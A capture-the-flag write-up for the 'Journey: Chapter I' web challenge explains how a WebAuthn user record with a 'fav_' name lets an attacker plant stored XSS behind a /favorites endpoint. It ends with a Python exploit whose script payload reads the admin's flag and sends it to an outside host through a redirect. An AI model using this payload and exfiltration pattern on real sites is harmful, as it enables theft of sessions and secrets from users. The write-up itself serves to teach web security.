# Journey: Chapter I (web, 278+16 pts, 10 solved)

To quote the source of `admin.html`,
```html
Your flag is: <span id="flag" style="font-weight: bold"></span></br>
<!-- ... -->
jsonReq('/get_admin').then(data => { console.log(data); $("#flag").text(data.flag); // ...
```

In the server source, we see
```javascript
app.get('/get_admin', (req, res) => req.session.isAdmin ? res.send({ flag: process.env.FLAG }) : res.send({ err: 'you are not an admin' }))
app.get('/admin_login', (req, res) => { 
    if (crypto.createHash("sha256").update(req.query.pass).digest("hex") === "03d8cdb4ca4edf3f1a1f85d54ebda0bd456b9a7d68029c8fe27ed1cdd7a4e2f3") {
        req.session.isAdmin = true
        res.redirect('/admin.html')
    }
    else
        res.send({ err: 'incorrect password' })
})
```
This means that we either need a way to change arbitrary things in the session,
or have the admin execute some JavaScript on our behalf. For a moment, we might
contemplate this part of the code:
```javascript
app.use(session({ secret: 'keyboard cat', saveUninitialized: true, resave: false, cookie: { maxAge: 48 * 60 * 60 * 1000 /* 48 hours */ } }))
```
... but a quick look at the documentation of `express-session` shows that
the session contents are stored server-side and the secret is only used to
sign the session ID (which itself is, if I'm reading the code correctly,
24 cryptorandom bytes).

Thus, it seems that XSS is the goal for this part of the challenge.

The problem stems from here:
```javascript
const db = new LevelAdapter('userdb');
const webauthn = new Webauthn({ origin: ORIGIN, store: db, rpName: 'SpamAndFlags CTF 2020 - Journey challenge' })
app.use('/webauthn', webauthn.initialize())
// ...
app.get('/favorites', async function (req, res) {
    const { favId, type } = req.query
    const obj = await db.get(`fav_${favId}`)
    if (obj && type in obj)
        res.send(obj[type])
    else
        res.send({ err: 'not found' })
});
```
The share-your-favorites feature shares the database with Webauthn. Upon a quick
inspection, we see that the latter uses usernames as the database keys:
```javascript
const user = {
  id: base64url(crypto.randomBytes(32)),
  [usernameField]: username,
}

Object.entries(this.config.userFields).forEach(([bodyKey, dbKey]) => {
  user[dbKey] = req.body[bodyKey]
})

await this.store.put(username, user)
```

What's this `userFields` thing? No such key was passed to the Webauthn constructor,
so the default will be used: `['name', 'displayName']`. This means that, if we hit
the `/webauthn/register` endpoint with `name` starting with `fav_`, we can make
the `/favorites` endpoint operate over an object we control:

```python
from random import randint
import requests as rq

URL = "http://journey.ctf.spamandhex.com"
ID = 'pwnujemy' + str(randint(0, 10**9))

payload = '<script>fetch("/get_admin", {method:"GET",credentials:"include"}).then(response => response.text()).then(flag => window.location="https://jakub.kadziolka.net/1337/cat.jpg?"+flag);</script>'

challenge = rq.post(URL+"/webauthn/register",
    json={
        'name': 'fav_' + ID,
        'displayName': payload
    }).json()

report = rq.get(URL+"/report",
    params={
        'url': URL+"/favorites?type=displayName&favId="+ID,
    })
```
